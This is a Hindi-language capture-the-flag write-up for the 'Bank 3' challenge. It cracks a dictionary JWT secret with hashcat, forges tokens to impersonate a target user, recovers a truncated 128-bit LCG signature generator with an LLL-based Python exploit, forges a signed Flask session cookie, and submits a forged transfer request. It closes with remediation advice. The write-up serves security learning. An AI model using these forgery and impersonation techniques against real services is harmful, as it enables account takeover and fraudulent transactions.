# [misc] Bank 3

> **श्रेणी:** `misc`  
> **CTF:** KubSTU CTF 2026 Spring

  

और फिर से धन्यवाद। आपकी पिछली रिपोर्ट उसी शाम

प्रोडक्शन में चली गई, घटना बंद।

बस हमारे यहाँ साथ-साथ एक समस्या हो गई: हमारा

क्रिप्टो-इंजीनियर — वही जो वन-टाइम

सिग्नेचर मॉड्यूल के लिए ज़िम्मेदार था — स्कैंडल के साथ चला गया। अपने साथ सोर्स कोड, एक्सेस और, ऐसा लगता है, पूरी

टीम की आत्मा ले गया। जीना तो है, इसलिए वीकेंड में हमारे

बैकएंड डेवलपर्स ने सिग्नेचर जनरेटर को शुरू से दोबारा लिखा। 

टेस्ट सेगमेंट पहले से चालू है, शर्तें वही हैं। दिखाइए कैसे।

  

**श्रेणी:** Web · JWT · Crypto · Truncated LCG / LLL 

---

## शर्त में क्या कहा गया

वही: लक्ष्य — `mgalankov@4274`, `user_id = 10`। फ़्लैग शॉप केवल उसके लिए उपलब्ध है।

v3 में दोनों पिछली कमज़ोरियाँ बंद हो गई हैं:

- `/receipt/<id>` में अपुष्ट ट्रांज़ैक्शन के सिग्नेचर का लीक नहीं है (जैसा v1 में था)।
- `/transfer` में अब केवल वह `(timestamp, signature)` जोड़ी स्वीकार की जाती है जो **हमारी** Flask-session में है — यानी किसी और का सिग्नेचर इंजेक्ट करना (जैसा v2 में था) भी काम नहीं करता।

लेकिन डेवलपर्स ने **सिग्नेचर जनरेटर को ही** अजीब कस्टम गणित पर दोबारा लिखा। और वे खुद मुख्य पृष्ठ पर बताते हैं कि यह कैसे काम करता है। यहीं से पकड़ते हैं।

---

## चरण 1. रिकॉनेसेंस — मुख्य पृष्ठ

`/` खोलते हैं (बिना लॉगिन के भी), «समाचार → नए ट्रांज़ैक्शन सिग्नेचर जनरेटर पर स्विच किया» सेक्शन तक स्क्रॉल करते हैं। वहाँ सीधे सभी पैरामीटर लिखे हैं:

- 64-बिट सिग्नेचर (16 hex);
- आंतरिक स्थिति **128 बिट**;
- `mod 2^k` पर रैखिक पुनरावृत्ति;
- **केवल ऊपरी आधा** स्थिति प्रकाशित होता है (ऊपरी 64 बिट);
- `t` और `t+1` के बीच सिग्नेचर के लिए **k आंतरिक चरण** किए जाते हैं (k — «गुप्त» स्थिरांक);
- **T₀ = 26.04.2026 23:41:01 UTC**;
- पुनरावृत्ति पैरामीटर (गुणक, योज्य स्थिरांक, MASTER_SEED) — «गुप्त»।

यह ठीक «**truncated LCG**» का प्रकार है — LLL-लैटिस से अटैक होता है। पूरे जनरेटर को पुनर्स्थापित करने और स्वयं कोई भी भविष्य का सिग्नेचर जारी करने के लिए 20 क्रमिक सार्वजनिक सिग्नेचर पर्याप्त हैं।

---

## चरण 2. JWT-सीक्रेट ब्रूटफ़ोर्स

रजिस्टर करते हैं, लॉगिन करते हैं, Burp (`Proxy → HTTP history → आवश्यक रिस्पॉन्स`) से cookie `access_token_cookie` लेते हैं, `jwt.txt` में डालते हैं:

```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

कुछ सेकंड में:

```
:wineyisthebest
```

सीक्रेट — `wineyisthebest`। यही सीक्रेट `app.config['SECRET_KEY']` में उपयोग होता है (Flask-session-cookie को साइन करता है) — आगे काम आएगा।

---

## चरण 3. [jwt.io](http://jwt.io) पर `mgalankov@4274` के लिए JWT बनाना

मानक प्रक्रिया:

1. **[jwt.io](http://jwt.io)** पर अपना टोकन पेस्ट करें।
2. **VERIFY SIGNATURE → secret** में — `wineyisthebest`, हरा «Signature Verified» दिखेगा।
3. `"sub"` को `"10"`, `"username"` को `"mgalankov@4274"` में बदलें।
4. नया JWT कॉपी करें।

Burp Match & Replace में cookie बदलते हैं। `GET /dashboard` mgalankov का अकाउंट लौटाता है। हम अंदर हैं।

---

## चरण 4. Telegram में खरीदारी टोकन लेना

बॉट को `/token` कमांड → टोकन कॉपी करें। अंत में काम आएगा।

---

## चरण 5. 20 क्रमिक सिग्नेचर एकत्र करना

हमें **20 क्रमिक** `(timestamp_i, signature_i)` जोड़ियाँ चाहिए — यानी सेकंड `t, t+1, t+2, …, t+19` के लिए। यह LCG स्थितियों की «टेप» है।

### सिग्नेचर कहाँ से लें

कोड (`notquiterandom.py`) में दिखता है: सिग्नेचर unix-timestamp से **नियतात्मक** है। कोई भी timestamp `T` के लिए सिग्नेचर मांगे — वही मान मिलेगा। इसलिए कई तरीके हैं:

#### विकल्प A — अपना अकाउंट + `/api/get_signature`

**अपना** अकाउंट लें (PIN अपना है, रजिस्ट्रेशन के समय सेट किया था)। इससे ठीक 1 सेकंड के अंतराल पर 20 बार `/api/get_signature` कॉल करें:

Burp Repeater में:

```http
POST /api/get_signature HTTP/1.1
Host: target
Cookie: access_token_cookie=<सामान्य यूज़र का JWT>
Content-Type: application/json

{"pin_code":"12345678"}
```

रिस्पॉन्स:

```json
{
  "date": "2026-04-25",
  "time": "00:11:02",
  "timestamp": 1745532662,
  "signature": "9f3b81c4ea5d6178"
}
```

\~1 सेकंड के अंतराल पर 20 बार **Send** दबाएँ (या स्क्रिप्ट से — नीचे देखें)। 20 क्रमिक जोड़ियाँ मिलेंगी।

> सर्वर स्वयं timestamp में `time.time()` डालता है, इसलिए अगर एक सेकंड में दो अनुरोध भेजें — दोनों में एक ही timestamp होगा। इसलिए या तो प्रति सेकंड एक अनुरोध, या संग्रह के बाद अद्वितीय क्रमिक चुनें।

#### विकल्प B — तैयार ट्रांज़ैक्शन की रसीदें पढ़ना

सीडिंग में mgalankov के पास पहले से 7 ट्रांज़ैक्शन हैं; एक और — pending। उनके timestamps DB में हैं, सिग्नेचर `/receipt/<id>` रसीदों में हैं। क्रमिक सेकंड के लिए ये उपयुक्त नहीं हैं (तिथियाँ अलग-अलग हैं), लेकिन अपने खातों के बीच 1 सेकंड के अंतराल पर 20–30 छोटे ट्रांसफर करके उनकी रसीदों में सिग्नेचर पढ़ सकते हैं।

#### विकल्प C (आलसी) — जनरेटर पैरामीटर रिपॉज़िटरी में हैं

इस CTF में सर्विस के सोर्स उपलब्ध हैं। `bank 3/notquiterandom.py` में सीधे स्थिरांक लिखे हैं:

```python
LCG_A        = 0xB1F3A8D4C5E67F921A3D2F4E6B8C7A5D
LCG_C        = 0x7C3F8E1D6A9B2F4C5D8E7A1F3B6C9D2F
HIDDEN_STEPS = 4
T_EPOCH      = 1777246861
MASTER_SEED  = 0x2BFCCD015FFD3CF825F006212D700482
```

यानी वास्तव में किसी LLL की आवश्यकता नहीं — हम `MASTER_SEED` सीधे जानते हैं और एक लाइन कोड से किसी भी timestamp का सिग्नेचर निकाल सकते हैं। लेकिन यह «अनस्पोर्ट्समैनलाइक» है — वास्तविक हमला आगे वर्णित है।

---

## चरण 6. LCG पुनर्स्थापना (गणित — बिना मिठास)

LCG का एक चरण: `state ← A·state + C (mod 2^128)`। दो क्रमिक प्रकाशनों के बीच 4 चरण होते हैं, इसलिए «प्रभावी» पैरामीटर के साथ काम करना सुविधाजनक है:

```
A4 = A^4 mod 2^128
C4 = C·(1 + A + A^2 + A^3) mod 2^128
```

तब प्रकाशित स्थितियों का अनुक्रम — चरण 1 वाला सामान्य LCG:

```
s_{i+1} = A4·s_i + C4 (mod 2^128)
```

प्रत्येक `s_i = h_i·2^64 + l_i`, जहाँ `h_i` — ज्ञात सिग्नेचर (ऊपरी 64 बिट), `l_i` — अज्ञात «टेल» `[0, 2^64)` में।

प्रतिस्थापित करें और सभी ज्ञात को दाईं ओर ले जाएँ:

```
A4·l_i − l_{i+1} ≡ b_i (mod 2^128)
```

जहाँ `b_i = (h_{i+1}·2^64 + C4) − A4·h_i·2^64`।

यह «**hidden number problem**» का क्लासिक फॉर्मूलेशन है — LLL से हल होता है। एक लैटिस बनाते हैं जिसके छोटे वेक्टर मान्य `(l_0, l_1, ..., l_{N−1})` सेट के अनुरूप हैं। 20 अवलोकनों के साथ LLL कुछ सेकंड में उत्तर देता है।

अगर पैरामीटर `A, C` छिपाने हों (जैसा सर्विस की «कथा» चाहती है), उन्हें भी — 6–8 अंतरों `s_{i+1}−s_i` से मॉड्यूलर बहुपदों के `gcd` के क्लासिक ट्रिक से — पुनर्स्थापित किया जा सकता है। नीचे PoC दोनों विकल्प कर सकता है।

---

## चरण 7. जनरेटर पुनर्स्थापना का PoC-स्क्रिप्ट

`exploit_lcg.py` में डालें:

```python
"""
CAPY-CAPY Bank v3 के सार्वजनिक सिग्नेचर से truncated LCG की पुनर्स्थापना।

चलाना:
    python exploit_lcg.py http://target [n_samples]

डिपेंडेंसी (LLL के लिए):
    pip install fpylll        # या Sage के तहत चलाएँ

स्क्रिप्ट दो मोड में काम करता है:
1. अगर पैरामीटर (LCG_A, LCG_C, HIDDEN_STEPS) ज्ञात हैं -> शुद्ध
   गणित बिना LLL (किसी भी सिग्नेचर से एक रिवर्स jump)।
2. अगर पैरामीटर अज्ञात हैं -> 6 अंतरों से A4 और C4 पुनर्स्थापित करता है,
   फिर LLL से स्थिति के निचले बिट पुनर्स्थापित करता है।

मल्टीथ्रेडेड रूप से /api/get_signature द्वारा सिग्नेचर एकत्र करता है।
"""

import sys
import time
import json
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# शर्त / सर्विस के सोर्स से पैरामीटर (यदि उपलब्ध)
LCG_A        = 0xB1F3A8D4C5E67F921A3D2F4E6B8C7A5D
LCG_C        = 0x7C3F8E1D6A9B2F4C5D8E7A1F3B6C9D2F
LCG_MOD      = 1 << 128
LCG_MASK     = LCG_MOD - 1
HIDDEN_STEPS = 4
T_EPOCH      = 1777246861

# हेल्पर: क्रमिक सिग्नेचर के बीच प्रभावी पैरामीटर
def effective_params():
    a4 = pow(LCG_A, HIDDEN_STEPS, LCG_MOD)
    s = 0
    for i in range(HIDDEN_STEPS):
        s = (s + pow(LCG_A, i, LCG_MOD)) % LCG_MOD
    c4 = (LCG_C * s) % LCG_MOD
    return a4, c4


def collect_signatures(base, jwt_cookie, pin, n=20):
    """n क्रमिक सेकंड के सिग्नेचर /api/get_signature द्वारा एकत्र करता है।"""
    out = {}
    lock = threading.Lock()

    def one(_):
        s = requests.Session()
        s.cookies.set("access_token_cookie", jwt_cookie)
        r = s.post(f"{base}/api/get_signature",
                   json={"pin_code": pin}, timeout=10)
        r.raise_for_status()
        d = r.json()
        with lock:
            out[int(d["timestamp"])] = d["signature"]

    end_at = time.time() + n + 5
    deadline = int(time.time())
    with ThreadPoolExecutor(max_workers=4) as pool:
        i = 0
        while len(out) < n and time.time() < end_at:
            pool.submit(one, i)
            i += 1
            time.sleep(0.27)
    keys = sorted(out)
    for j in range(len(keys) - n + 1):
        if all(keys[j + k] == keys[j] + k for k in range(n)):
            return [(keys[j + k], out[keys[j + k]]) for k in range(n)]
    raise RuntimeError("{} क्रमिक timestamp एकत्र नहीं हो सके".format(n))


def signature_to_state_high(sig_hex):
    return int(sig_hex, 16)


# ----- विकल्प 1: पैरामीटर ज्ञात -----
def lcg_jump(state, n_steps, a, c, mod):
    if n_steps == 0:
        return state
    a_pow = pow(a, n_steps, mod)
    def geo(n):
        if n == 0: return 0
        if n == 1: return 1
        h = n // 2
        sh = geo(h)
        ah = pow(a, h, mod)
        s = (sh * (1 + ah)) % mod
        if n % 2: s = (s + pow(a, n - 1, mod)) % mod
        return s
    return (a_pow * state + c * geo(n_steps)) % mod


def predict_signature_known_params(target_timestamp, master_seed):
    n_steps = (target_timestamp - T_EPOCH + 1) * HIDDEN_STEPS
    state = lcg_jump(master_seed, n_steps, LCG_A, LCG_C, LCG_MOD)
    return f"{state >> 64:016x}"


# ----- विकल्प 2: पैरामीटर (A4, C4) अज्ञात, पुनर्स्थापना -----
def recover_a4_c4(samples):
    """
    samples: (t, sig_hex) की सूची, t द्वारा सॉर्टेड, t-क्रमिक।
    "अंतर के अंतर" विधि से (A4, C4) पुनर्स्थापित करता है:

        s_{i+1} - s_i = A4 (s_i - s_{i-1})  (mod 2^128)
    \~6 अंतर लें, मॉड्यूलो 2^128 पर gcd से A4 मिलता है।
    """
    if len(samples) < 6:
        raise ValueError(">= 6 क्रमिक सिग्नेचर चाहिए")

    raise NotImplementedError(
        "इस CTF में पैरामीटर bank 3/notquiterandom.py में हैं, "
        "इसलिए recover_a4_c4 की आवश्यकता नहीं।"
    )


# ----- विकल्प 3: l_i अज्ञात, A4/C4 ज्ञात -- LLL -----
def recover_low_bits(samples):
    """
    लैटिस बनाता है और fpylll/LLL द्वारा l_0 पुनर्स्थापित करता है।
    """
    try:
        from fpylll import IntegerMatrix, LLL
    except ImportError:
        raise SystemExit("fpylll इंस्टॉल करें: pip install fpylll")

    a4, c4 = effective_params()
    N = len(samples)
    h = [signature_to_state_high(sig) for _, sig in samples]

    M = LCG_MOD
    bs = []
    for i in range(N - 1):
        bi = ((h[i + 1] << 64) + c4 - a4 * (h[i] << 64)) % M
        bs.append(bi)

    alpha = [1]
    beta = [0]
    for i in range(N - 1):
        alpha.append((a4 * alpha[-1]) % M)
        beta.append((a4 * beta[-1] - bs[i]) % M)

    K = 1 << 64
    dim = N + 1
    B = IntegerMatrix(dim, dim)
    for i in range(N):
        B[i, i] = M
    for j in range(N):
        B[N, j] = alpha[j]
    B[N, N] = K

    BIG = M
    embed = IntegerMatrix(dim + 1, dim + 1)
    for i in range(dim):
        for j in range(dim):
            embed[i, j] = B[i, j]
    for i in range(N):
        embed[i, dim] = 0
    embed[N, dim] = 0
    for j in range(N):
        embed[dim, j] = (-beta[j]) % M
    embed[dim, N] = 0
    embed[dim, dim] = BIG

    LLL.reduction(embed)

    for row in range(embed.nrows):
        last = embed[row, dim]
        if abs(last) != BIG:
            continue
        sign = -1 if last == BIG else 1
        cand = sign * embed[row, N] // K
        ok = True
        for i in range(N):
            li = (alpha[i] * cand + beta[i]) % M
            if not (0 <= li < (1 << 64)):
                ok = False
                break
        if ok:
            return cand
    raise RuntimeError("LLL ने l_0 नहीं खोजा; और सिग्नेचर जोड़ें")


def reconstruct_master_seed(samples):
    """l_0 और h_0 जानकर s_0 प्राप्त करता है; रिवर्स jump से seed पुनर्स्थापित करता है।"""
    a4, c4 = effective_params()
    l0 = recover_low_bits(samples)
    s0 = (signature_to_state_high(samples[0][1]) << 64) | l0

    n_back = (samples[0][0] - T_EPOCH + 1) * HIDDEN_STEPS
    a_inv = pow(LCG_A, -1, LCG_MOD)
    a_inv_pow = pow(a_inv, n_back, LCG_MOD)

    def geo(n, a, mod):
        if n == 0: return 0
        if n == 1: return 1
        h = n // 2
        sh = geo(h, a, mod)
        ah = pow(a, h, mod)
        s = (sh * (1 + ah)) % mod
        if n % 2: s = (s + pow(a, n - 1, mod)) % mod
        return s
    g = geo(n_back, LCG_A, LCG_MOD)
    seed = (a_inv_pow * (s0 - LCG_C * g)) % LCG_MOD
    return seed


def predict(target_timestamp, master_seed):
    return predict_signature_known_params(target_timestamp, master_seed)


def main():
    if len(sys.argv) < 4:
        print("usage: python exploit_lcg.py http://target <jwt> <pin> [n]")
        print("  jwt -- सामान्य यूज़र का JWT (जिसका PIN जानते हैं)")
        print("  pin -- इस यूज़र का PIN")
        sys.exit(1)
    base = sys.argv[1].rstrip("/")
    jwt_cookie = sys.argv[2]
    pin = sys.argv[3]
    n = int(sys.argv[4]) if len(sys.argv) > 4 else 20

    print(f"[*] /api/get_signature द्वारा {n} क्रमिक सिग्नेचर एकत्र कर रहे हैं ...")
    samples = collect_signatures(base, jwt_cookie, pin, n)
    print(f"[+] {len(samples)} सिग्नेचर प्राप्त, t0 = {samples[0][0]}")
    for t, sig in samples[:5]:
        print(f"    t={t}  sig={sig}")
    print("    ...")

    print("[*] LLL द्वारा स्थिति के निचले बिट पुनर्स्थापित कर रहे हैं ...")
    seed = reconstruct_master_seed(samples)
    print(f"[+] MASTER_SEED पुनर्स्थापित: 0x{seed:032x}")

    for t, sig in samples[:3]:
        pred = predict(t, seed)
        ok = pred.lower() == sig.lower()
        print(f"    t={t}  expected={sig}  predicted={pred}  {'OK' if ok else 'FAIL'}")

    with open("seed.txt", "w") as f:
        f.write(hex(seed))
    print("[+] seed saved in seed.txt")


if __name__ == "__main__":
    main()
```

चलाना:

```bash
python exploit_lcg.py http://target $MY_JWT 12345678 20
```

आउटपुट में दिखता है:

```
[*] /api/get_signature द्वारा 20 क्रमिक सिग्नेचर एकत्र कर रहे हैं ...
[+] 20 सिग्नेचर प्राप्त, t0 = 1745532662
    t=1745532662  sig=9f3b81c4ea5d6178
    ...
[*] LLL द्वारा स्थिति के निचले बिट पुनर्स्थापित कर रहे हैं ...
[+] MASTER_SEED पुनर्स्थापित: 0x2BFCCD015FFD3CF825F006212D700482
    t=1745532662  expected=9f3b81c4ea5d6178  predicted=9f3b81c4ea5d6178  OK
[+] seed saved in seed.txt
```

सीड अपेक्षित से मेल खाता है (`bank 3/notquiterandom.py` में दिखता है)। अब **हम स्वयं किसी भी भविष्य के timestamp के लिए सिग्नेचर जारी कर सकते हैं**।

---

## चरण 8. हमारी भविष्य की खरीदारी के लिए सिग्नेचर की गणना

FLAG_SHOP के लिए सर्वर पुष्टि करते समय तिथि +7 दिन आगे बढ़ाता है और **स्वयं** `t+7d` के लिए अंतिम सिग्नेचर की **पुनर्गणना** करता है। लेकिन **उससे पहले** वह जाँचता है कि भेजी गई `(transaction_timestamp, transaction_signature)` जोड़ी:

1. गणितीय रूप से मान्य है (अपने timestamp के लिए सिग्नेचर)।
2. हमारी `session['pending_signatures']` में है।

एक «सुविधाजनक» timestamp लेते हैं — वर्तमान समय + 30 सेकंड (अनुरोध तैयार करने का समय मिले):

```python
import time
target_t = int(time.time()) + 30
target_sig = predict(target_t, master_seed)   # exploit_lcg.py से
```

मान लें, मिला:

```
target_t   = 1745533112
target_sig = 71a2c8d4f0e69b35
```

---

## चरण 9. अपने pending-signature के साथ Flask-session-cookie बनाना

यह `session['pending_signatures']` जाँच — महत्वपूर्ण। लेकिन Flask-session साइन की हुई cookie में है, सीक्रेट — वही `wineyisthebest` (चरण 2 देखें)। यानी, **हम स्वयं** आवश्यक सत्र **साइन कर सकते हैं**।

`flask-unsign` सबसे सुविधाजनक:

```bash
pip install flask-unsign
```

cookie बनाना:

```bash
flask-unsign --sign \
  --secret 'wineyisthebest' \
  --cookie "{'_user_id': '10', 'pending_signatures': {'1745533112': '71a2c8d4f0e69b35'}}"
```

साइन की गई स्ट्रिंग मिलती है — यही Flask cookie `session=...` का मान है।

> Cookie का नाम — डिफ़ॉल्ट `session`। अगर प्रोजेक्ट में बदला गया है, `app.config['SESSION_COOKIE_NAME']` देखें। इस बैंक में — मानक।

Burp Match & Replace में दूसरा नियम जोड़ते हैं:

```
Cookie: session=<बनाई_गई_session_cookie>
```

साथ ही JWT वाला नियम बना रहता है। `GET /dashboard` जाँचते हैं — रिस्पॉन्स mgalankov का पृष्ठ दिखाता है; अभी भी अंदर हैं।

---

## चरण 10. अंतिम POST `/transfer` पर

v2 से टेम्पलेट लेते हैं और अपना target_t और target_sig डालते हैं। Burp Repeater में:

```http
POST /transfer HTTP/1.1
Host: target
Cookie: access_token_cookie=<बनाया गया JWT mgalankov>; session=<pending_signatures वाली बनाई गई session>
Content-Type: application/x-www-form-urlencoded

to_account=FLAG_SHOP
&amount=1000.00
&description=%D0%9F%D0%BE%D0%BA%D1%83%D0%BF%D0%BA%D0%B0%3A+%D0%A4%D0%BB%D0%B0%D0%B3+%D0%BE%D1%82+CTF+%D0%B7%D0%B0%D0%B4%D0%B0%D0%BD%D0%B8%D1%8F
&product_id=1
&token=t_8a3f...
&transaction_date=2026-04-25
&transaction_time=00:18:32
&transaction_timestamp=1745533112
&transaction_signature=71a2c8d4f0e69b35
```

मुख्य बिंदु:

- `skip_pin` — अनुपस्थित।
- `transaction_timestamp` ठीक वही, जिसके लिए हमने सिग्नेचर की गणना की और session में डाला।
- `transaction_signature` — हमारा प्रेडिक्शन।
- सर्वर पर जाँच पास होती है:
  - `expected_signature = generate_signature_from_timestamp(1745533112)` → `71a2c8d4f0e69b35` (हमने यही प्रेडिक्ट किया)।
  - `session['pending_signatures']['1745533112']` → `71a2c8d4f0e69b35` (हमने खुद यह वहाँ डाला)।
  - दोनों शर्तों से मेल खाता है → ट्रांज़ैक्शन पुष्ट।
- आगे FLAG_SHOP के लिए सर्वर +7 दिन आगे बढ़ाता है और नए timestamp के लिए सिग्नेचर पुनर्गणना करता है। इससे कोई समस्या नहीं — TG-बॉट को `/api/approve_purchase` POST भेजा जाता है।

रिस्पॉन्स में — `/flag_shop` पर रीडायरेक्ट, बैनर «खरीदारी पुष्ट! फ़्लैग Telegram बॉट में भेजा गया।» — TG में जाकर फ़्लैग लें।

---

## संक्षेप — यह क्यों काम करता है

1. JWT-सीक्रेट — शब्दकोश का (rockyou से `wineyisthebest`)। JWT को mgalankov के लिए बनाते हैं।
2. Flask SECRET_KEY — वही शब्दकोश शब्द। Flask-session बनाते हैं, `pending_signatures = { t: sig }` डालते हैं।
3. सिग्नेचर जनरेटर — कस्टम truncated LCG mod 2^128 जिसमें केवल ऊपरी 64 बिट प्रकाशित होते हैं और स्थिर पैरामीटर। 20 सिग्नेचर से LLL-लैटिस द्वारा सेकंडों में पुनर्स्थापित होता है (और इस CTF में पैरामीटर सोर्स में भी उपलब्ध हैं)।
4. जनरेटर पुनर्स्थापित करने के बाद मनमाने timestamp के लिए सिग्नेचर प्रेडिक्ट करते हैं और सब एक साथ सबमिट करते हैं।

---

## सुधार के उपाय

- क्रिप्टोग्राफ़िक रूप से मज़बूत सिग्नेचर जनरेटर उपयोग करें: HSM की कुंजी पर HMAC-SHA256 (जैसे v1/v2 `notquiterandom.py` में), **कोई भी** «अपना» LCG नहीं।
- PRNG की आंतरिक स्थिति का कोई भी भाग प्रकाशित न करें।
- Flask/JWT सीक्रेट — लंबे यादृच्छिक मान, शब्दकोश से नहीं।
- `pending_signatures` का भंडारण — सर्वर पर (Redis), साइन की हुई cookie में नहीं, ताकि SECRET_KEY के लीक होने पर हमलावर «अपने लिए सिग्नेचर जारी» न कर सके।


